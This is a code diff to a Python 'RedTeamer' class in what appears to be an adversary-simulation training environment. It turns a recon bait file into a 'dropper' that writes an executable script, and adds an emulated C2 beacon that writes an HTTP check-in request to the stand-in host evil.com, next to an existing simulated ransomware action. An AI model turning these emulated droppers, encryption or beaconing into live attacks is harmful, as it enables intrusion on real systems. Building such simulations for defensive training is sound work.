@@ -123,12 +123,18 @@ class RedTeamer:
                 impact = 0
 
                 if action == "T1046_RECON":
-                    # Low Entropy Bait
-                    fname = os.path.join(TARGET_DIR, f"malware_bait_{int(time.time())}.sh")
+                    # Dropper: Drops an actual executable script
+                    fname = os.path.join(TARGET_DIR, f"malware_dropper_{int(time.time())}.py")
+                    payload = """#!/usr/bin/env python3
+import os
+print('I am running!')
+# Real reconnaissance logic could go here
+"""
                     try:
-                        with open(fname, 'w') as f: f.write("echo 'scan'")
+                        with open(fname, 'w') as f: f.write(payload)
+                        os.chmod(fname, 0o755) # Make executable
                         impact = 1
-                        self.audit.log_event("RED", "ATTACK_BAIT", fname)
+                        self.audit.log_event("RED", "ATTACK_DROPPER", fname)
                     except: pass
                     self.log_evolution("T1046_RECON", impact > 0)
 
@@ -183,6 +189,23 @@ class RedTeamer:
                             self.audit.log_event("RED", "ATTACK_RANSOMWARE", target_path)
                     except: pass
                     self.log_evolution("T1486_ENCRYPT", impact > 0)
+
+                elif action == "T1071_WEB_TRAFFIC":
+                    # C2 Beaconing: Create a "network traffic" file (emulated socket)
+                    # We create a file in a separate directory if possible, or just a distinguishable file
+                    # Let's create a "network_bus" directory for this.
+                    impact = 0
+                    try:
+                        net_dir = os.path.join(os.path.dirname(TARGET_DIR), "network_bus")
+                        if not os.path.exists(net_dir): os.makedirs(net_dir, exist_ok=True)
+
+                        fname = os.path.join(net_dir, f"beacon_{int(time.time())}.dat")
+                        with open(fname, 'w') as f:
+                            f.write("POST /c2/checkin HTTP/1.1\nHost: evil.com\n\n" + "A"*64)
+                        impact = 2
+                        self.audit.log_event("RED", "ATTACK_C2_BEACON", fname)
+                    except: pass
+                    self.log_evolution("T1071_WEB_TRAFFIC", impact > 0)
 
                 # 4. REWARDS
                 reward = 0
